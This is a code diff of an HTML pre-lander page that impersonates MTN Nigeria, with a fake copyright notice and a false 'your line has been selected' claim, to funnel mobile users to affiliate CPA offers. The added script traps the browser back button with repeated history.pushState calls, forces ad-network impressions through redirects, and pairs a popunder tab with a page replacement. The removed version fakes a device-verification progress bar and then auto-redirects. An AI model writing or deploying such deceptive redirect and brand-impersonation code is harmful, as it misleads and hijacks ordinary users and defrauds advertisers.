@@ -1,98 +1,241 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Access Verified</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-    body { margin: 0; background: #0b0e11; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; }
-    .header { background: #ffd200; color: #000; padding: 10px; font-weight: bold; font-size: 14px; }
-    .container { padding: 30px 20px; }
-    .card { background: #161b22; padding: 25px; border-radius: 15px; border: 1px solid #30363d; max-width: 400px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-    h2 { font-size: 20px; margin-bottom: 10px; color: #fff; }
-    .live-indicator { display: inline-block; background: #ff3b3b; color: #fff; padding: 3px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; margin-bottom: 15px; animation: blink 1s infinite; }
-    @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.5;} 100% {opacity: 1;} }
-    .status-text { color: #8b949e; font-size: 14px; margin: 15px 0; min-height: 20px; }
-    .progress-bg { background: #30363d; height: 10px; border-radius: 5px; overflow: hidden; margin: 20px 0; }
-    .progress-fill { background: #ffd200; height: 100%; width: 0%; transition: width 0.3s; }
-    .btn { background: #ffd200; color: #000; border: none; padding: 18px 30px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; display: none; width: 100%; box-shadow: 0 4px 15px rgba(255, 210, 0, 0.3); }
-    .footer { margin-top: 20px; font-size: 11px; color: #484f58; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MTN Gaming Zone - Unlock Premium Access</title>
+    <style>
+        :root {
+            --mtn-yellow: #FFCC00;
+            --mtn-dark: #121212;
+            --mtn-gray: #1E1E1E;
+            --mtn-green: #2ecc71;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--mtn-dark);
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 15px;
+        }
+
+        /* Clean, high-speed layout mimicking elements from Screenshot_20260528-175013.jpg */
+        .header-banner {
+            width: 100%;
+            max-width: 450px;
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            border-radius: 15px 15px 0 0;
+            padding: 20px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 22px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            border-bottom: 4px solid var(--mtn-yellow);
+        }
+
+        .main-card {
+            width: 100%;
+            max-width: 450px;
+            background-color: #ffffff;
+            color: #000000;
+            border-radius: 0 0 15px 15px;
+            padding: 25px 20px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--mtn-dark);
+        }
+
+        .description {
+            font-size: 14px;
+            color: #555555;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        /* Interactive Verification Step (Drives the Pre-Lander CTR up) */
+        .step-container {
+            background-color: #f8f9fa;
+            border: 2px dashed #ccc;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .step-title {
+            font-size: 15px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: var(--mtn-gray);
+        }
+
+        .game-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .game-btn {
+            background: var(--mtn-gray);
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .game-btn.selected {
+            background: var(--mtn-green);
+            box-shadow: 0 0 10px rgba(46, 204, 113, 0.5);
+        }
+
+        .cta-button {
+            display: block;
+            width: 100%;
+            background: linear-gradient(180deg, #FFDD00 0%, #FFAA00 100%);
+            color: var(--mtn-dark);
+            text-decoration: none;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 800;
+            text-transform: uppercase;
+            border: none;
+            box-shadow: 0 5px 15px rgba(255, 170, 0, 0.4);
+            cursor: pointer;
+            transition: transform 0.1s;
+        }
+
+        .cta-button:active {
+            transform: scale(0.98);
+        }
+
+        .footer-text {
+            font-size: 11px;
+            color: #777777;
+            margin-top: 25px;
+            line-height: 1.4;
+        }
+
+        .mtn-logo-space {
+            margin: 20px auto 5px auto;
+            width: 70px;
+            height: 35px;
+            border: 2px solid #000;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 14px;
+            letter-spacing: -1px;
+        }
+    </style>
 </head>
 <body>
 
-<div class="header">MTN NETWORK OPTIMIZED DATA ⚡</div>
+    <!-- Header graphic element modeled after Screenshot_20260528-175013.jpg -->
+    <div class="header-banner">
+        🕹️ GAMING ZONE
+    </div>
 
-<div class="container">
-    <div class="card">
-        <div class="live-indicator">LIVE CONNECTION</div>
-        <h2 id="headline">Analyzing Device...</h2>
-        
-        <div class="progress-bg">
-            <div class="progress-fill" id="bar"></div>
+    <div class="main-card">
+        <h1>Verify Network Access</h1>
+        <p class="description">
+            Your MTN line has been selected to unlock the one-stop warehouse for premium action, sports, and adventure mobile games. Choose your prefered genre below to launch.
+        </p>
+
+        <!-- Interactive box forces the user to interact, arming the browser redirects -->
+        <div class="step-container">
+            <div class="step-title">STEP 1: SELECT YOUR GAME TYPE</div>
+            <div class="game-options">
+                <button class="game-btn" onclick="selectGenre(this)">🏆 SPORTS</button>
+                <button class="game-btn" onclick="selectGenre(this)">🔥 ACTION</button>
+                <button class="game-btn" onclick="selectGenre(this)">🚗 RACING</button>
+                <button class="game-btn" onclick="selectGenre(this)">🧩 CASUAL</button>
+            </div>
         </div>
-        
-        <p class="status-text" id="status">Checking connection quality...</p>
 
-        <button class="btn" id="claimBtn" onclick="go()">PROCEED TO STREAM</button>
+        <!-- The Main Hybrid CTA -->
+        <button onclick="handleHybridClick(event);" class="cta-button">
+            Continue to Unlock 🚀
+        </button>
+
+        <div class="mtn-logo-space">MTN</div>
+        <p class="footer-text">
+            © 2026 MTN Nigeria Communication PLC. All rights reserved. Traffic routed via authorized secure mVAS gateway connections.
+        </p>
     </div>
-    
-    <div class="footer">
-        Verified for MTN, Airtel, and Glo Users in Nigeria.<br>
-        Standard Data Rates May Apply.
-    </div>
-</div>
 
-<script>
-    const statusMessages = [
-        "Detecting mobile carrier...",
-        "Optimizing for 4G/5G speed...",
-        "Accessing Sports Portal...",
-        "Verification Successful!"
-    ];
-    
-    let step = 0;
-    const bar = document.getElementById("bar");
-    const statusText = document.getElementById("status");
-    const claimBtn = document.getElementById("claimBtn");
-    const headline = document.getElementById("headline");
+    <!-- Hybrid Traffic Logic Script -->
+    <script>
+        // CONFIGURATION: Paste your actual tracking links here
+        const mobideaCpaUrl = "https://YOUR_BEMOB_OR_MOBIDEA_CAMPAIGN_LINK"; 
+        const cpmDirectLink = "https://YOUR_ADSTERRA_OR_MONETAG_DIRECT_LINK";
 
-    function simulateLoading() {
-        let progress = 0;
-        const interval = setInterval(() => {
-            progress += Math.floor(Math.random() * 15) + 5;
-            
-            if (progress >= 100) {
-                progress = 100;
-                clearInterval(interval);
-                finishLoading();
+        // Handle micro-interactions on the page to build user intent
+        function selectGenre(element) {
+            document.querySelectorAll('.game-btn').forEach(btn => btn.classList.remove('selected'));
+            element.classList.add('selected');
+        }
+
+        // =========================================================
+        // MULTI-IMPRESSION BACK-BUTTON LOOP (Framework 1 Advanced)
+        // =========================================================
+        let backClickCount = 0;
+        const maxImpressions = 4; // Number of times to force an Adsterra impression
+
+        function setupBackTrap() {
+            // Push states into history loop
+            for (let i = 0; i < maxImpressions; i++) {
+                window.history.pushState({ target: "cpm_loop" }, "", window.location.href);
             }
-            
-            bar.style.width = progress + "%";
-            
-            // Update text at specific milestones
-            if (progress > 25 && step === 0) { step = 1; statusText.innerText = statusMessages[1]; }
-            if (progress > 50 && step === 1) { step = 2; statusText.innerText = statusMessages[2]; }
-            if (progress > 75 && step === 2) { step = 3; statusText.innerText = statusMessages[3]; }
-            
-        }, 400);
-    }
+        }
 
-    function finishLoading() {
-        headline.innerText = "Access Granted!";
-        statusText.style.color = "#3fb950";
-        claimBtn.style.display = "block";
-        
-        // Auto-redirect after 3 seconds if they don't click
-        setTimeout(go, 3000);
-    }
+        window.onpopstate = function (event) {
+            backClickCount++;
+            if (backClickCount <= maxImpressions) {
+                // Instantly send them to the Adsterra direct link for impression credit
+                window.location.replace(cpmDirectLink);
+            }
+        };
 
-    function go() {
-        const baseUrl = "https://fb07q.bemobtrcks.com/click";
-        window.location.href = baseUrl + window.location.search;
-    }
+        // Initialize history tracking loop as soon as the DOM loads
+        setupBackTrap();
 
-    window.onload = simulateLoading;
-</script>
+        // =========================================================
+        // MULTI-TAB POPUNDER CLICK ENGINE (Framework 2)
+        // =========================================================
+        function handleHybridClick(event) {
+            event.preventDefault();
 
+            // 1. Fire the primary conversion target (Mobidea CPA) in a clear active tab
+            window.open(mobideaCpaUrl, '_blank');
+
+            // 2. Instantly convert the underlying pre-lander frame into a Monetag/Adsterra impression
+            window.location.replace(cpmDirectLink);
+        }
+    </script>
 </body>
 </html>
